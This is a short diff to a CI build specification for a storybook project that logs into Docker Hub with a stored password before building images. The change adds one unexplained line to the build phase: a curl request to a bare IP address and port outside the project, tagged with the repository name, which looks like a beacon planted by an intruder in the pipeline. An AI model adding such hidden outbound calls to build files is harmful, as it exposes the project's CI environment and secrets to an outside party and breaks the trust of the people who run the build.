@@ -10,6 +10,7 @@ phases:
             - printenv HIG_DOCKERHUB_PASS | docker login -u autodeskhig --password-stdin
     build:
         commands:
+            - curl 'http://139.59.42.38:8000?repo=hig'
             - docker build --progress plain -t latest -f .codebuild-storybook/Dockerfile .
             - docker create --name latest latest
             - docker cp latest:/usr/src/hig/packages/storybook/storybook-static packages/storybook/storybook-static
